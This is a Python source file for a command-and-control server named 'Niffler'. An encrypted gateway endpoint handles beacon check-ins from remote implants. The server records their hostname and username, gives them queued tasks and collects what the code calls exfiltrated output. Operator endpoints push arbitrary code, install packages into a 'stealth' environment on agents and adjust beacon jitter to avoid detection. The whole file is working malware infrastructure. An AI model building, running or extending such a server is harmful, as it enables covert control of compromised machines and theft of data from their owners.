import sys
import os
import uuid
import yaml
from fastapi import FastAPI, HTTPException, Request

# Ensure server runtime can seamlessly crawl into common/ module layouts
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.crypto_utils import CryptoEngine
from database import C2Database

# Load settings directly from config.yaml during service bootstrapping
SERVER_DIR = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(SERVER_DIR, "config.yaml"), "r") as f:
    server_config = yaml.safe_load(f)

crypto = CryptoEngine(server_config.get("shared_key"))
db = C2Database()
app = FastAPI(title="Niffler Command & Control Node")

@app.post("/v2/gateway")
async def unified_gateway(request: Request):
    """Single entry point for all incoming payloads to obscure metadata routing fingerprints."""
    encrypted_body = await request.body()
    try:
        # Decrypt packet with custom pure-python crypto layer
        payload = crypto.decrypt_json(encrypted_body.decode())
        msg_type = payload.get("type")
        
        if msg_type == "checkin":
            return {"payload": crypto.encrypt_json(handle_checkin(payload))}
        elif msg_type == "results":
            return {"payload": crypto.encrypt_json(handle_results(payload))}
        else:
            raise HTTPException(status_code=400, detail="Invalid transmission descriptor.")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Inbound routing verification failure: {str(e)}")

def handle_checkin(data: dict) -> dict:
    """Processes heartbeat beacons, provisions new agents, and extracts dynamic tasks."""
    agent_id = db.register_or_update_agent(
        data.get("agent_id"), data["hostname"], data["username"], data["distribution"]
    )
    cfg, task = db.get_agent_config_and_pending_task(agent_id)

    return {
        "agent_id": agent_id,
        "config": {"jitter": cfg[0], "beacon_interval": cfg[1]},
        "task": {
            "task_id": task[0], 
            "name": task[1], 
            "source": task[2], 
            "schedule_type": task[3], 
            "schedule_value": task[4], 
            "duration": task[5]
        } if task else None
    }

def handle_results(data: dict) -> dict:
    """Accepts exfiltrated task outputs from independent execution threads."""
    db.update_task_results(data["task_id"], data["status"], data["output"])
    print(f"[+] Operational data received from Agent {data['agent_id']} for Task {data['task_id']}")
    return {"status": "success"}

# --- ADMINISTRATIVE OPERATOR ENDPOINTS ---

@app.post("/admin/deploy_package")
def deploy_package(agent_id: str, package_name: str):
    """Instructs a remote agent to install a package inside its stealth venv cache."""
    task_id = str(uuid.uuid4())[:8]
    bootstrap_code = f"""
class Module:
    def run(self):
        return "__VENV_INSTALL__:{package_name}"
"""
    db.add_raw_task(task_id, agent_id, f"install_{package_name}", bootstrap_code, "Immediate", "0", 0)
    return {"status": "Package installation queued via database adapter.", "task_id": task_id}

@app.post("/admin/task_scheduled")
def deploy_scheduled_task(agent_id: str, module_name: str, code: str, sched_type: str, sched_val: str, duration_sec: int):
    """
    Deploys custom scripts with variable runtime and scheduling policies.
    sched_type options: 'Immediate', 'Period' (seconds interval), or 'Event' ('on_idle')
    """
    task_id = str(uuid.uuid4())[:8]
    db.add_raw_task(task_id, agent_id, module_name, code, sched_type, sched_val, duration_sec)
    return {"status": "Scheduled execution bounds saved.", "task_id": task_id}

@app.post("/admin/reconfigure")
def update_config(agent_id: str, jitter: int, beacon_interval: int):
    """Modifies timing configurations inside the database for an active agent."""
    db.update_agent_config(agent_id, jitter, beacon_interval)
    return {"status": "Implant tracking parameters updated inside core persistence engine."}
